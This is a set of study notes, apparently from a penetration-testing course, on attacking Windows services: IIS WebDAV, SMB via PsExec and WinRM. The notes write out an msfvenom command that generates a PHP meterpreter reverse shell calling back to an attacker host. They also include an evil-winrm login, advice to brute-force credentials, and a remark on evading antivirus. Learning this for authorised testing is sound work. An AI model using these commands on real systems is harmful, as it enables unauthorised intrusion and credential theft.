<html>
  
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="../../style.css">
    <base target="_parent">
    <title data-trilium-title>Exploiting Windows Vulnerabilities</title>
  </head>
  
  <body>
    <div class="content">
       <h1 data-trilium-h1>Exploiting Windows Vulnerabilities</h1>

      <div class="ck-content">
        <h3>Exploiting IIS with WebDav</h3>
        <ul>
          <li data-list-item-id="e1fd9d122a1f86522a7af198ec851aa97">
            <figure class="image">
              <img style="aspect-ratio:944/532;" src="3_Exploiting Windows Vulnera.png"
              width="944" height="532">
            </figure>
            <ul>
              <li data-list-item-id="ee8b84b94efd000a79dd78226db6d55fb">IIS gives admins a robust GUI for managing the server</li>
              <li data-list-item-id="e47f1d0c319d92bcb322a4d7f81e513df">can host both static and dynamic webpages</li>
              <li data-list-item-id="ea4096a036ac4a9c0eb81a970c1d85e1e">can host a <strong>asp or php</strong> website</li>
            </ul>
          </li>
          <li data-list-item-id="e663e67e9e2805a9891f2669b7a89809b">
            <figure class="image">
              <img style="aspect-ratio:952/530;" src="Exploiting Windows Vulnera.png"
              width="952" height="530">
            </figure>
            <ul>
              <li data-list-item-id="e23b9aaacda5a25224f1294667cd89dc1">can work on apache or IIS</li>
            </ul>
          </li>
        </ul>
        <hr>
        <h3>WebDav with Metasploit</h3>
        <ul>
          <li data-list-item-id="e7f19314bfe6602a94e72a906dbeb22f4">we can use msfvenom to make a custom pyload
            <ul>
              <li class="ck-list-marker-bold" data-list-item-id="eaefe4c0fb11a25d4ec400a784da1401f"><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw &gt; shell.php</strong>
              </li>
              <li data-list-item-id="e23509356260cdb0de1a547761d161f80">one of the example use syntax of msfvenom</li>
              <li data-list-item-id="ebe05209c28f61c59634eb8557c306ea4">it is always recommended to use the 32bit payload as it works on all the
                machines</li>
            </ul>
          </li>
          <li data-list-item-id="ea25e753c31b307877797322f3b313230">after getting the reverse shell from the target we need to send the stage
            because the reverse shell doesnt actually give us full control over the
            target so we need to send a stage (a script that helps us with getting
            control over the system) to get maximum control, a meterpreter session</li>
          <li
          data-list-item-id="e6447ecd08fd69e6ebbd7368ad556aba3">
            <figure class="image">
              <img style="aspect-ratio:1680/889;" src="1_Exploiting Windows Vulnera.png"
              width="1680" height="889">
            </figure>
            <ul>
              <li data-list-item-id="e9983ffb3a7d1e952338da98641a830da"><strong>use multi/handler </strong>is used to setup the listener from
                within the msfconsole for the payload that we made manually</li>
              <li data-list-item-id="ef00816db271f535231a64e906288b49d">the payload name in <strong>set payload </strong>should be the same payload
                that we used in msfvenom to make the payload</li>
              <li data-list-item-id="e3456eb91ce574f2aabb793220e717d25">set the options accordingly</li>
              <li data-list-item-id="e248642ef12ec3aaaa28d0a569769305b">after clicking the payload in the webdav directory msfconsole will automatically
                send the stage &nbsp;and get a meterpreter session from the target</li>
            </ul>
            </li>
            <li data-list-item-id="e909c0dd66f56d938f3fa42e557833b68">A metasploit module with the name <strong>iis upload </strong>automates
              all the above process from within the metasploit framwork
              <ul>
                <li data-list-item-id="e748b72d6d02844f1881cfacdf6f62d91">for this module you need to send the http username and pass options to
                  the legit pass</li>
                <li data-list-item-id="e166468caf3ebf364f9c7b05c45efc3fa">if the server is running at port 443 remember to set the RPORT to 443
                  and SSL option to true</li>
                <li data-list-item-id="e96a36acfa6f5982395a62cef712222e1">The PATH option in this module is the path to which msf will try to upload
                  the payload so we need to set it to the path that allows file upload and
                  such as <strong>set PATH /directory_which_allows_file-upload/filename</strong>
                </li>
                <li data-list-item-id="e2baf08241d3b89a2c0b642f97395770e">after this just run the module</li>
              </ul>
            </li>
        </ul>
        <p><em><strong><u>NOTE: &nbsp;</u></strong></em>THE MODULE DEPENDS WHETHER
          TARGET SUPPORTS <strong>ASP </strong>EXECUTION. OTHERWISE WE NEED TO USE
          ANOTHER TECHNIQUE</p>
        <hr>
        <h3>Exploiting SMB with PsExec</h3>
        <ul>
          <li data-list-item-id="e111c9747eb28b43a896675238051873b">most of the time it has authentication</li>
          <li data-list-item-id="eefbbcd9dc24a6e72d7a9baa64c74a4c7">SAMBA is the open source Linux implementation of SMB, and allows Windows
            systems to access Linux shares and devices.&nbsp;</li>
          <li data-list-item-id="e3bdd21500361402f3ba9cce6d942dfb7">
            <figure class="image">
              <img style="aspect-ratio:952/534;" src="6_Exploiting Windows Vulnera.png"
              width="952" height="534">
            </figure>
            <ul>
              <li data-list-item-id="e00d471eecd56954a8be287f68c19a8e7">SMB creds are same as user account creds in windows system</li>
            </ul>
          </li>
          <li data-list-item-id="ed8fa39720b7fc3b19415dc76f12af703">
            <figure class="image">
              <img style="aspect-ratio:945/529;" src="10_Exploiting Windows Vulnera.png"
              width="945" height="529">
            </figure>
            <ul>
              <li data-list-item-id="e31b5bb4f471f507c385c6d938d374887">in order to use PsExec you need to provide legit creds</li>
              <li data-list-item-id="e4f82914229bbbf8cbfe38182b72442c6">you can brute force smb creds with msf module</li>
              <li data-list-item-id="ec1954fe83ed72a629d22537269221c0f">there is a psexec script written in python that provides us with the functionality
                because we cant execute .exe on linux
                <ul>
                  <li data-list-item-id="e1a8f107a2fdec0a426dd6807e290691d">allows us to authenticate with the target system</li>
                </ul>
              </li>
              <li data-list-item-id="e26b18bc70f323685c60a14e7400f3b59">
                <figure class="image">
                  <img style="aspect-ratio:886/447;" src="7_Exploiting Windows Vulnera.png"
                  width="886" height="447">
                </figure>
                <ul>
                  <li data-list-item-id="e834a3b65e28fe667894940526a06206b">red is the command you use for psexec.py to work and orange is the command
                    you want to execute on the target machine</li>
                </ul>
              </li>
            </ul>
          </li>
          <li data-list-item-id="ebd2e390f7c925d019a4da3d59b4379b9">in this exploit or vulnerability we arent running a script on the target
            rather using windows utilities and tools to get access this doesnt get
            flagged by the antivirus because we arent uploading anything</li>
          <li data-list-item-id="e25a9e51aa67d1516add8329bbf42e639">we can do this via msf psexec module as well
            <ul>
              <li data-list-item-id="ef7d41f16df0175cc2e7664846da73994">this runs a malicious payload on the target which may get flagged by the
                antivirus</li>
            </ul>
          </li>
        </ul>
        <hr>
        <h3>Exploiting WinRM</h3>
        <ul>
          <li data-list-item-id="e8d2d0b2a159a7a64c1ce94db3a17e44b">
            <figure class="image">
              <img style="aspect-ratio:958/526;" src="8_Exploiting Windows Vulnera.png"
              width="958" height="526">
            </figure>
          </li>
          <li data-list-item-id="e053428ee22f39640ac02de82d2081921">WInRM in windows is equivalent of ssh in linux</li>
          <li data-list-item-id="eebd70fa2033b9f0f2ede70f6cbb55e84">Using <strong>Evil-WinRM</strong> (popular tool for attackers &amp; red
            teamers):
            <ul>
              <li data-list-item-id="e2f9e36fbb329ed82297ae3a4a5455f70"><code><span>evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'</span></code>
              </li>
              <li data-list-item-id="e6220b650219656889ec6f1fa2724327d">
                <figure class="image">
                  <img style="aspect-ratio:952/88;" src="9_Exploiting Windows Vulnera.png"
                  width="952" height="88">
                </figure>
              </li>
            </ul>
          </li>
          <li data-list-item-id="e524fb462bd2dcfc0799f3e4a7dd45796">
            <figure class="image">
              <img style="aspect-ratio:950/533;" src="2_Exploiting Windows Vulnera.png"
              width="950" height="533">
            </figure>
          </li>
          <li data-list-item-id="e34f09ec745bd4a5f27b0456074917920">in nmap scan for winrm, windows doesnt really have a banner for the service
            so it will might give a wrong banner</li>
          <li data-list-item-id="e46f27c3585d89a739ea368cc7aa9c2d7">
            <p>example command for crackmapexec:</p>
            <figure class="image">
              <img style="aspect-ratio:1314/136;" src="5_Exploiting Windows Vulnera.png"
              width="1314" height="136">
            </figure>
          </li>
          <li data-list-item-id="ee158e585c5c5185fd04c13105af45cdd">winrm is an implementation of windows management API</li>
          <li data-list-item-id="e93c39e1f78d1fd540d0917eeed2e095e">we can use crackmapexec to execute arbitrary commands on windows targets</li>
          <li
          data-list-item-id="e34aed9ab798ee990bf97ef244f0b410f">there is a metsploit module for this&nbsp;</li>
            <li data-list-item-id="edeb7521747cab208baaefe73354f0661">
              <figure class="image">
                <img style="aspect-ratio:1295/724;" src="4_Exploiting Windows Vulnera.png"
                width="1295" height="724">
              </figure>
              <ul>
                <li data-list-item-id="e1618a339671d0acea2f5befe4e6a0894"><strong>set FORCE_VBS true </strong>enables the use of visual basic language
                  for exploitation</li>
                <li data-list-item-id="e2d505a066fc9c3cfc8e3081101d09ab4">the odds of failing for this module are alittle bit more than usual so
                  try more than 2 times if it fails</li>
              </ul>
            </li>
            <li data-list-item-id="ef6112cc8640efcb62c61c0951d229642">do brute force attack for creds on winrm with crackmapexec to get the
              creds</li>
        </ul>
      </div>
    </div>
  </body>

</html>